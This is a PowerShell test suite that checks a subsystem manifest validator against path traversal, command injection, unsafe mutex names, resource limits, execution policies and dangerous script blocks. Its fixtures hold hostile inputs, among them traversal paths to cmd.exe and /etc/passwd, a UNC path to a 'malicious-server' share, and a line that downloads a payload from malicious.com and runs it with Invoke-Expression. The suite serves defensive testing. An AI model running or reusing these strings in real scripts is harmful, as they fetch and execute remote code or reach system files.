# Test-SecurityHardening.ps1
# Phase 3, Day 3: Production Readiness - Security Hardening Tests
# Tests path traversal prevention, execution policy checks, and mutex security

param(
    [switch]$Verbose,
    [switch]$SaveResults
)

# Initialize test environment
$testStartTime = Get-Date
$testResults = @()
$totalTests = 0
$passedTests = 0
$failedTests = 0

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "Security Hardening Test Suite" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Start Time: $testStartTime" -ForegroundColor Gray

# Import required modules
try {
    $modulePath = Join-Path (Split-Path $PSScriptRoot -Parent) "Modules\Unity-Claude-SystemStatus"
    Import-Module $modulePath -Force -ErrorAction Stop
    Write-Host "[OK] SystemStatus module loaded" -ForegroundColor Green
} catch {
    Write-Host "[ERROR] Failed to load SystemStatus module: $_" -ForegroundColor Red
    exit 1
}

# Test helper function
function Test-SecurityFeature {
    param(
        [string]$TestName,
        [scriptblock]$TestScript,
        [string]$ExpectedResult = "Pass"
    )
    
    $totalTests++
    Write-Host "`n[TEST $totalTests] $TestName" -ForegroundColor Yellow
    
    try {
        $result = & $TestScript
        
        $testPassed = if ($ExpectedResult -eq "Pass") {
            $result -eq $true -or $result.IsSecure -eq $true -or $result.IsValid -eq $true
        } elseif ($ExpectedResult -eq "Fail") {
            $result -eq $false -or $result.IsSecure -eq $false -or $result.IsValid -eq $false
        } else {
            $result -eq $ExpectedResult
        }
        
        if ($testPassed) {
            Write-Host "  [PASS] $TestName" -ForegroundColor Green
            $passedTests++
            $status = "PASS"
        } else {
            Write-Host "  [FAIL] $TestName" -ForegroundColor Red
            Write-Host "  Expected: $ExpectedResult, Got: $result" -ForegroundColor Red
            $failedTests++
            $status = "FAIL"
        }
        
        $testResults += [PSCustomObject]@{
            TestNumber = $totalTests
            TestName = $TestName
            Status = $status
            Result = $result
            Expected = $ExpectedResult
            Timestamp = Get-Date
        }
        
    } catch {
        Write-Host "  [ERROR] $TestName - $_" -ForegroundColor Red
        $failedTests++
        
        $testResults += [PSCustomObject]@{
            TestNumber = $totalTests
            TestName = $TestName
            Status = "ERROR"
            Error = $_.ToString()
            Expected = $ExpectedResult
            Timestamp = Get-Date
        }
    }
}

# ============================================
# TEST GROUP 1: Path Traversal Prevention
# ============================================
Write-Host "`n[GROUP 1] Path Traversal Prevention Tests" -ForegroundColor Cyan

# Test 1.1: Detect parent directory traversal
Test-SecurityFeature "Path Traversal - Parent Directory (..\\)" {
    $manifest = @{
        Name = "TestSubsystem"
        StartScript = "..\\..\\Windows\\System32\\cmd.exe"
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Fail"

# Test 1.2: Detect Unix-style traversal
Test-SecurityFeature "Path Traversal - Unix Style (../)" {
    $manifest = @{
        Name = "TestSubsystem"
        StartScript = "../../../etc/passwd"
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Fail"

# Test 1.3: Detect UNC path injection
Test-SecurityFeature "Path Traversal - UNC Path" {
    $manifest = @{
        Name = "TestSubsystem"
        StartScript = "\\\\malicious-server\\share\\evil.ps1"
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Fail"

# Test 1.4: Detect environment variable injection
Test-SecurityFeature "Path Traversal - Environment Variable" {
    $manifest = @{
        Name = "TestSubsystem"
        StartScript = '$env:TEMP\malicious.ps1'
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Fail"

# Test 1.5: Valid relative path should pass
Test-SecurityFeature "Path Traversal - Valid Relative Path" {
    $manifest = @{
        Name = "TestSubsystem"
        StartScript = ".\Scripts\Start-Subsystem.ps1"
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Pass"

# ============================================
# TEST GROUP 2: Command Injection Prevention
# ============================================
Write-Host "`n[GROUP 2] Command Injection Prevention Tests" -ForegroundColor Cyan

# Test 2.1: Detect Invoke-Expression
Test-SecurityFeature "Command Injection - Invoke-Expression" {
    $manifest = @{
        Name = "TestSubsystem"
        StartCommand = 'Invoke-Expression "Get-Process"'
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Fail"

# Test 2.2: Detect command substitution
Test-SecurityFeature "Command Injection - Command Substitution" {
    $manifest = @{
        Name = "TestSubsystem"
        HealthCheckCommand = '$(malicious-command)'
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Fail"

# Test 2.3: Detect pipe operator
Test-SecurityFeature "Command Injection - Pipe Operator" {
    $manifest = @{
        Name = "TestSubsystem"
        StartScript = "script.ps1 | Out-File secret.txt"
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Fail"

# Test 2.4: Safe command should pass
Test-SecurityFeature "Command Injection - Safe Command" {
    $manifest = @{
        Name = "TestSubsystem"
        StartCommand = "Get-Process -Name MyProcess"
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    # Note: Simple commands without injection patterns should pass
    return $result.IsSecure
} -ExpectedResult "Pass"

# ============================================
# TEST GROUP 3: Mutex Security
# ============================================
Write-Host "`n[GROUP 3] Mutex Security Tests" -ForegroundColor Cyan

# Test 3.1: Create secure mutex with strict mode
Test-SecurityFeature "Mutex Security - Strict Mode Creation" {
    $mutexResult = New-SecureMutex -MutexName "TestSecureMutex" -StrictSecurity
    $isValid = $mutexResult.Mutex -ne $null -and $mutexResult.StrictSecurity -eq $true
    if ($mutexResult.Mutex) { $mutexResult.Mutex.Dispose() }
    return $isValid
} -ExpectedResult "Pass"

# Test 3.2: Validate mutex name format
Test-SecurityFeature "Mutex Security - Invalid Name Format" {
    $manifest = @{
        Name = "TestSubsystem"
        MutexName = "Global\Invalid;Mutex;Name"
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Fail"

# Test 3.3: Valid mutex name
Test-SecurityFeature "Mutex Security - Valid Global Mutex" {
    $manifest = @{
        Name = "TestSubsystem"
        MutexName = "Global\UnityClaudeTestMutex"
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    # Global mutex with valid format should pass basic validation
    return $result.IsSecure
} -ExpectedResult "Pass"

# Test 3.4: Test mutex security validation
Test-SecurityFeature "Mutex Security - Security Validation" {
    $mutexResult = New-SecureMutex -MutexName "TestSecurityCheck" -StrictSecurity
    $securityReport = Test-MutexSecurity -Mutex $mutexResult.Mutex
    $isSecure = $securityReport.IsSecure
    if ($mutexResult.Mutex) { $mutexResult.Mutex.Dispose() }
    return $isSecure
} -ExpectedResult "Pass"

# ============================================
# TEST GROUP 4: Resource Limits Validation
# ============================================
Write-Host "`n[GROUP 4] Resource Limits Validation Tests" -ForegroundColor Cyan

# Test 4.1: Invalid memory limit
Test-SecurityFeature "Resource Limits - Invalid Memory" {
    $manifest = @{
        Name = "TestSubsystem"
        MaxMemoryMB = 99999
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    # Should generate recommendation but not fail
    return $result.Recommendations.Count -gt 0
} -ExpectedResult "Pass"

# Test 4.2: Invalid CPU limit
Test-SecurityFeature "Resource Limits - Invalid CPU" {
    $manifest = @{
        Name = "TestSubsystem"
        MaxCpuPercent = 150
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Fail"

# Test 4.3: Valid resource limits
Test-SecurityFeature "Resource Limits - Valid Limits" {
    $manifest = @{
        Name = "TestSubsystem"
        MaxMemoryMB = 512
        MaxCpuPercent = 25
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Pass"

# ============================================
# TEST GROUP 5: Execution Policy Checks
# ============================================
Write-Host "`n[GROUP 5] Execution Policy Validation Tests" -ForegroundColor Cyan

# Test 5.1: Detect unsafe execution policy requirement
Test-SecurityFeature "Execution Policy - Unsafe Requirement" {
    $manifest = @{
        Name = "TestSubsystem"
        RequiredExecutionPolicy = "Unrestricted"
    }
    $result = Test-ManifestSecurity -Manifest $manifest -StrictMode
    return $result.IsSecure
} -ExpectedResult "Fail"

# Test 5.2: Safe execution policy requirement
Test-SecurityFeature "Execution Policy - Safe Requirement" {
    $manifest = @{
        Name = "TestSubsystem"
        RequiredExecutionPolicy = "RemoteSigned"
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Pass"

# ============================================
# TEST GROUP 6: Script Block Security
# ============================================
Write-Host "`n[GROUP 6] Script Block Security Tests" -ForegroundColor Cyan

# Test 6.1: Detect dangerous commands in script blocks
Test-SecurityFeature "Script Block - Dangerous Commands" {
    $manifest = @{
        Name = "TestSubsystem"
        InitializationScript = {
            Invoke-WebRequest -Uri "http://malicious.com/payload" | Invoke-Expression
        }
    }
    $result = Test-ManifestSecurity -Manifest $manifest -StrictMode
    return $result.IsSecure
} -ExpectedResult "Fail"

# Test 6.2: Safe script block
Test-SecurityFeature "Script Block - Safe Commands" {
    $manifest = @{
        Name = "TestSubsystem"
        InitializationScript = {
            Write-Host "Initializing subsystem"
            Get-Date
        }
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Pass"

# ============================================
# TEST GROUP 7: Integration Tests
# ============================================
Write-Host "`n[GROUP 7] Security Integration Tests" -ForegroundColor Cyan

# Test 7.1: Complete manifest security validation
Test-SecurityFeature "Integration - Full Manifest Validation" {
    $manifest = @{
        Name = "SecureSubsystem"
        Version = "1.0.0"
        StartScript = ".\Start-SecureSubsystem.ps1"
        Dependencies = @("SystemStatus")
        MutexName = "Local\SecureSubsystem"
        MaxMemoryMB = 256
        MaxCpuPercent = 20
        RequiredExecutionPolicy = "RemoteSigned"
    }
    $result = Test-ManifestSecurity -Manifest $manifest
    return $result.IsSecure
} -ExpectedResult "Pass"

# Test 7.2: Manifest with multiple security issues
Test-SecurityFeature "Integration - Multiple Security Issues" {
    $manifest = @{
        Name = "InsecureSubsystem"
        StartScript = "..\\..\\evil.ps1"
        StartCommand = 'Invoke-Expression $input'
        MutexName = "Global\Bad;Mutex"
        MaxCpuPercent = 200
    }
    $result = Test-ManifestSecurity -Manifest $manifest -StrictMode
    # Should have multiple security issues
    return $result.SecurityIssues.Count -ge 3
} -ExpectedResult "Pass"

# ============================================
# RESULTS SUMMARY
# ============================================
$testEndTime = Get-Date
$duration = $testEndTime - $testStartTime

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "Security Hardening Test Results" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Total Tests: $totalTests" -ForegroundColor White
Write-Host "Passed: $passedTests" -ForegroundColor Green
Write-Host "Failed: $failedTests" -ForegroundColor $(if ($failedTests -eq 0) { "Green" } else { "Red" })
Write-Host "Success Rate: $([math]::Round(($passedTests / $totalTests) * 100, 2))%" -ForegroundColor $(if ($failedTests -eq 0) { "Green" } else { "Yellow" })
Write-Host "Duration: $($duration.TotalSeconds) seconds" -ForegroundColor Gray

# Save results if requested
if ($SaveResults) {
    $resultsFile = Join-Path $PSScriptRoot "Test_Results_SecurityHardening_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
    
    $output = @"
Security Hardening Test Results
================================
Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Total Tests: $totalTests
Passed: $passedTests
Failed: $failedTests
Success Rate: $([math]::Round(($passedTests / $totalTests) * 100, 2))%
Duration: $($duration.TotalSeconds) seconds

Test Details:
"@
    
    foreach ($test in $testResults) {
        $output += "`n`nTest #$($test.TestNumber): $($test.TestName)"
        $output += "`nStatus: $($test.Status)"
        if ($test.Status -eq "ERROR") {
            $output += "`nError: $($test.Error)"
        } else {
            $output += "`nExpected: $($test.Expected)"
            $output += "`nResult: $($test.Result)"
        }
        $output += "`nTimestamp: $($test.Timestamp)"
    }
    
    $output | Out-File -FilePath $resultsFile -Encoding UTF8
    Write-Host "`nResults saved to: $resultsFile" -ForegroundColor Gray
}

# Return success/failure for CI/CD
exit $(if ($failedTests -eq 0) { 0 } else { 1 })